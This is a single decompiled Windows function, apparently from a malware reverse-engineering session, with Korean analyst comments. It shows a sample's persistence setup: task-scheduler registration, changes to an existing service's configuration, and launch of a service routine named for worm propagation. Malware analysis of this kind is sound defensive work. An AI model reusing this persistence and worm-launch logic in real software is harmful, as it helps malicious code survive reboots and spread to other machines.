// --- Metadata ---
// Function Name: StartServiceDispatcher_408090
// Address: 0x408090
// Exported At: 20250527_184354
// Signature: unknown_signature
// ---------------
int StartServiceDispatcher_408090()
{
  SC_HANDLE v1; // eax
  SC_HANDLE v2; // edi
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // esi
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+8h] [ebp-8h]
  int v7; // [esp+Ch] [ebp-4h]

  GetModuleFileNameA(0, FileName, 0x104u);
  if ( *_p___argc() < 2 )
    return excuteTaskscheAndaddService_407F20();// 서비스로 실행된 경우: 메인 서비스 시작 
  v1 = OpenSCManagerA(0, 0, 0xF003Fu);          // 일반 실행된 경우: 작업 스케줄러 등록 
  v2 = v1;
  if ( v1 )
  {
    v3 = OpenServiceA(v1, ServiceName, 0xF01FFu);
    v4 = v3;
    if ( v3 )
    {
      ChangeServiceConfig_407FA0(v3, 60);       //     기존 서비스가 있으면 ChangeServiceConfig()로 설정 변경 
      CloseServiceHandle(v4);
    }
    CloseServiceHandle(v2);
  }
  ServiceStartTable.lpServiceName = ServiceName;
  ServiceStartTable.lpServiceProc = serviceMainWithWormPropagation_408000;
  v6 = 0;
  v7 = 0;
  return StartServiceCtrlDispatcherA(&ServiceStartTable);// StartServiceCtrlDispatcher()로 서비스 실행 제어 시작 
}
